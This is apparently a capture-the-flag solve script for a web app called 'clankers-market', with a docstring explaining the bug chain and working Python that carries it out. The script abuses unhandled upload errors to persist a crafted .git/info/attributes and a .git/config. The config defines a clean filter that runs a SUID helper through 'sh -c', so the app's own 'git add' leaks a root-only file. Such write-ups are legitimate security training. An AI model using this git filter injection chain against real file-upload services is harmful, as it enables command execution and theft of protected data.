#!/usr/bin/env python3
"""
Exploit for clankers-market.

Bug chain:
1. file.save happens after setup_git_storage runs `git init`+commits. The app
   never wraps file.save / os.makedirs in try/except. If the SECOND file we
   upload triggers an os.makedirs error (because its parent dir is actually a
   file we saved as the first upload), the request 500s BEFORE sanitize() runs.
   → whatever the first upload wrote to /tmp/git_storage PERSISTS to the next
   request because nuke() is only called inside the later try/except blocks.

2. git-init on an existing repo is idempotent and PRESERVES .git/config and
   .git/info/attributes. So if we stage a filter config + attributes ahead of
   time, setup_git_storage's `git init . && git add .` will run our clean
   filter over every file being staged.

3. The clean filter `sh -c "/usr/local/bin/read-flag;cat"` calls the SUID
   helper `read-flag` (group=web, 4750) which cats /flag.txt as root. Its
   output replaces the blob content for every tracked file — so the committed
   flag.txt blob actually contains /flag.txt's contents, and the xargs `cat`
   keeps the original stdin appended so each request still produces a unique
   blob (otherwise `git commit -m 'ctf is so easy'` errors with "nothing to
   commit" and the request 500s).

4. Putting the attributes in `.git/info/attributes` (instead of `.gitattributes`
   in the tree) keeps the filename `.gitattributes` OUT of `.git/index`.
   Sanitize runs `grep -rlZ 'git' . | xargs rm` which would otherwise delete
   .git/index (because of the `.gitattributes` string inside). Without this
   trick, git-dumper's `git checkout .` fails with "pathspec '.' did not match".

5. After git-dumper downloads /tmp/dump/, `git checkout .` materialises
   flag.txt from the index. No filter config survives there, so no filter is
   re-applied on checkout — the blob bytes are written verbatim. /tmp/dump/
   flag.txt contains the real flag, which the app happily returns to us.
"""
import requests, sys, io, re

URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"

s = requests.Session()
s.post(f"{URL}/register", data={"username":"pwn","password":"pwn"})

def upload(files):
    mpart = [("file", (n, io.BytesIO(c), "application/octet-stream")) for n, c in files]
    return s.post(f"{URL}/clanker-feature", files=mpart)

# Request A: persist .git/info/attributes (filter applied to every path).
# First file saved OK, second file's dirname conflicts with file A → 500
# before sanitize runs.
print("[*] A: persist .git/info/attributes")
rA = upload([
    (".git/info/attributes", b"* filter=x\n"),
    (".git/info/attributes/boom", b"x"),
])
print("    ->", rA.status_code)

# Request B: persist .git/config with filter definition.
# read-flag is the SUID helper; we pipe stdin through via `cat` so each
# request's random flag.txt still produces a unique blob.
print("[*] B: persist .git/config with filter")
config = (
    b'[filter "x"]\n'
    b'\tclean = sh -c "/usr/local/bin/read-flag;cat"\n'
    b'\trequired = true\n'
)
rB = upload([
    (".git/config", config),
    (".git/config/boom", b"x"),
])
print("    ->", rB.status_code)

# Request C: trigger. setup_git_storage reuses our filter, writes flag.txt,
# git add applies the clean filter → committed blob contains the real flag.
# Uploads here just need to not break anything.
print("[*] C: trigger")
rC = upload([
    ("trivial1.txt", b"hello\n"),
    ("trivial2.txt", b"world\n"),
])
print("    ->", rC.status_code)

m = re.search(rb"Congrats:\s*(bctf\{[^}]+\})", rC.content)
if m:
    flag = m.group(1).decode()
    print("\n[+] FLAG:", flag)
    with open(__file__.replace("solve.py", "flag.txt"), "w") as f:
        f.write(flag + "\n")
else:
    print("\n[!] No flag. Response snippet:")
    for line in rC.content.splitlines():
        if any(t in line.lower() for t in (b"bctf", b"error", b"leak", b"success")):
            print("    ", line.decode(errors="replace").strip())
